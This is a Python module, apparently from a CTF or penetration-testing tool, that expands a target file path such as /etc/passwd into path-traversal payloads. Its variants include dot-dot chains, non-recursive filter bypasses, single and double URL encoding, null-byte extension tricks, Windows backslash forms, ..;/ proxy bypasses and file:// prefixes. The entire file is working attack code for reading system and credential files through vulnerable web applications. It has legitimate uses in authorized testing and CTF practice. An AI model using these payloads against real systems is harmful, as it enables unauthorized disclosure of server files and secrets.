"""Bypass engine: expand one target file into all path-traversal bypass families.

Encodings are applied deliberately on the canonical segments — we never re-quote
an already-encoded string, which would triple-encode and break the payload.
"""

COMMON_BASES = ["/var/www/images/", "/var/www/html/", "/var/www/", "/home/user/"]
NULL_EXTS = [".png", ".jpg", ".pdf"]


def _rel(target_file: str) -> str:
    """'/etc/passwd' -> 'etc/passwd' (strip a single leading slash)."""
    return target_file[1:] if target_file.startswith("/") else target_file


def _basic(rel, depth):
    return [("../" * n) + rel for n in range(1, depth + 1)]


def _nonrecursive(rel, depth):
    out = []
    for n in range(1, depth + 1):
        out.append(("....//" * n) + rel)
        out.append(("....\\/" * n) + rel)
    return out


def _encoded(rel, depth):
    out = []
    for n in range(1, depth + 1):
        out.append(("%2e%2e%2f" * n) + rel)
        out.append(("..%2f" * n) + rel)
        out.append(("%252e%252e%252f" * n) + rel)
    return out


def _leading_path(rel, depth):
    out = []
    for base in COMMON_BASES:
        for n in range(1, depth + 1):
            out.append(base + ("../" * n) + rel)
    return out


def _null_byte(rel, depth):
    out = []
    for ext in NULL_EXTS:
        for n in range(1, depth + 1):
            out.append(("../" * n) + rel + "%00" + ext)
    return out


def _windows(rel, depth):
    win_rel = rel.replace("/", "\\")
    out = []
    for n in range(1, depth + 1):
        out.append(("..\\" * n) + win_rel)
        out.append(("..\\/" * n) + win_rel)
        out.append(("%2e%2e%5c" * n) + win_rel)
    return out


def _extended(rel, depth):
    """CTF extras: reverse-proxy and protocol-prefix bypasses."""
    out = []
    for n in range(1, depth + 1):
        out.append(("..;/" * n) + rel)
    out.append("file:///" + rel)
    out.append("url:file:///" + rel)
    return out


def generate_payloads(target_file: str, depth: int = 8, os_filter: str = "both") -> list:
    rel = _rel(target_file)
    out = []
    out.append(target_file)
    out += _basic(rel, depth)
    out += _nonrecursive(rel, depth)
    out += _encoded(rel, depth)
    out += _leading_path(rel, depth)
    out += _null_byte(rel, depth)
    out += _extended(rel, depth)
    if os_filter in ("windows", "both"):
        out += _windows(rel, depth)
    return list(dict.fromkeys(out))
